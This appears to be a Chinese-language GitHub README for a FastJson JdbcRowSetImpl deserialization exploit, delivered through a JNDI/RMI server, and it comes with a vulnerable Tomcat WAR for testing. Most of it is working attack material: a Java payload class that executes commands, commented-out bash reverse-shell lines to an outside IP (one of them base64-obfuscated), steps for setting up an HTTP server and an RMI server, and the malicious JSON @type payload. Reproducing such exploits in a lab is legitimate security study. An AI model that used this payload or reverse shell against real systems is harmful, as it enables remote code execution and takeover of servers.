# FastJson-JdbcRowSetImpl
### JNDI加载RMI方式，附漏洞环境 &amp; 利用Exp。

## 环境构建

```
root@Bearcat:/# wget "https://github.com/iBearcat/FastJson-JdbcRowSetImpl/raw/master/FastJson_Vul.war" -P path.... & cd  ${path}/opt/apache-tomcat-8.5.24/bin & ./startup.sh"
```

![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/1.jpg?raw=true)

### 访问漏洞环境 http://localhost:8888/FastJson_Vul

![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/2.jpg?raw=true)

## 漏洞利用

### 在CommandObject.java中构造commands命令数组

### 编译 javac CommandObject.java

```
import	java.lang.Runtime;
import	java.lang.Process;
public class CommandObject {
    public CommandObject(){
        try{
			Runtime	rt	=	Runtime.getRuntime();
			//Runtime.getRuntime().exec("/bin/bash -i >&/dev/tcp/192.168.43.14/2018<&1");
			//String[] commands = {"bash -c {echo,L2Jpbi9iYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC40My4xNC8yMDE4PCYx}|{base64,-d}|{bash,-i}"};
			
			String[] commands = {"touch","/opt/test"}; //Command
			Process	pc = rt.exec(commands);
			pc.waitFor();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        CommandObject e = new CommandObject();
    }
}
```

![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/3.jpg?raw=true)

## 漏洞利用

### 开启一个HTTP服务，并且开启 RMIServer

### 如：

```
Python2 -m SimpleHTTPServer 80
Python3 -m http.server 80
```

```
java -jar FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar <HTTP服务地址> 指定RMI端口
```
### FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar 会生成一串JSON PAYLOAD，把它copy到漏洞环境的input中，然后submit。

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://192.168.43.14:6666/Object","autoCommit":true}
```
![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/5.jpg?raw=true)

### 

![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/4.jpg?raw=true)

### 开始攻击并执行命令


